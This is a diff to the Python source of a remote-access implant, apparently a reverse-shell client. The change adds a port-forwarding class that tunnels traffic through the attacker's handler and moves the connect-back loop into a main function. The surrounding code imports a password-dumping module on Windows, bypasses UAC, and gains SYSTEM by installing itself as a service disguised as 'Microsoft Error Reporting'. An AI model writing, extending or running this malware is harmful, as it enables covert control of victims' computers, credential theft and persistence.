@@ -11,13 +11,14 @@ from Crypto.Random import random
 import zlib
 import base64
 import hashlib
-import ctypes
 import getpass
+import ctypes
 import sys
 
 if os.name == "nt":
 	import passdump
 	import win32net
+
 	
 logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
 
@@ -151,6 +152,49 @@ class ProxyConnection:
 			t = StoppableThread(target=f)
 			t.daemon = True
 			t.start()
+			
+class PortForwarder:
+	"""
+	This is the reverse of the socks proxy. Instead of talking the socksv4 protocol, it simply binds to a local port and forwards all data to a host specified on creation, proxying it through the handler.
+	"""
+	def __init__(self, channel, bind_port):
+		self.channel = channel # TODO: Make it accept multiple connections!!!!!!
+		self.bind_port = bind_port
+		self.bind_sock = socket.socket()
+		self.disconnected = False
+		
+		self.bind_sock.bind(("0.0.0.0", self.bind_port))
+		self.bind_sock.listen(1)
+		
+		t = StoppableThread(target=self.run)
+		t.daemon = True
+		t.start()
+		
+	def run(self):
+		self.client_socket, addr = self.bind_sock.accept()
+		
+		for f in [self.reader, self.writer]:
+			t = StoppableThread(target=f)
+			t.daemon = True
+			t.start()
+		
+	def reader(self):
+		ct = threading.currentThread()
+		while not ct.stopped() and not self.disconnected:
+			data = self.client_socket.recv(8192)
+			if not data:
+				self.disconnected = True
+				self.channel.stale = True
+				return
+			self.send(data)
+			
+	def writer(self):
+		ct = threading.currentThread()
+		while not ct.stopped() and not self.disconnected:
+			data = self.channel.read_input()
+			self.client_socket.sendall(data)
+
+		
 	
 class Transport:
 	""""
@@ -383,7 +427,7 @@ class Privilege_Escalation:
 		logging.info("Attempting to bypass UAC.")
 		if misc.isadmin():
 			logging.debug("UAC bypass failed: Process already has admin privileges.")
-			return "[*]You already have admin privileges!"
+			return "[*]You already have admin privileges!" # Check your privilege!
 		 
 		if not misc.is_user_in_group(misc.name_of_admin_group(), getpass.getuser()):
 			logging.debug("UAC bypass failed: Current user is not part of admin group.")
@@ -414,7 +458,7 @@ class Privilege_Escalation:
 		
 	@windows_only
 	def get_system(self):
-		if not misc.isadmin(): return "[-]You need admin privileges to get system."
+		if not misc.isadmin(): return "[-]You need admin privileges to get system." # Check your privilege! (That was funny the first time)
 		self.create_service(os.path.abspath(sys.executable), '"Microsoft Error Reporting"')
 		return "BG_NEW_SESH"
 		
@@ -482,12 +526,16 @@ class Shell:
 		
 	def recv(self):
 		return self.channel.read_input()
-		
-while True:
-	shell = Shell(Transport("127.0.0.1",8080))
-	if not shell.run():
-		del shell
-		for t in threading.enumerate():
-			try: t.stop() # RED LIGHT
-			except: pass
-		time.sleep(5)
+			
+def main():
+	while True:
+		shell = Shell(Transport("127.0.0.1",8080))
+		if not shell.run():
+			del shell
+			for t in threading.enumerate():
+				try: t.stop() # RED LIGHT
+				except: pass
+			time.sleep(5)
+			
+if __name__ == "__main__":
+	main()
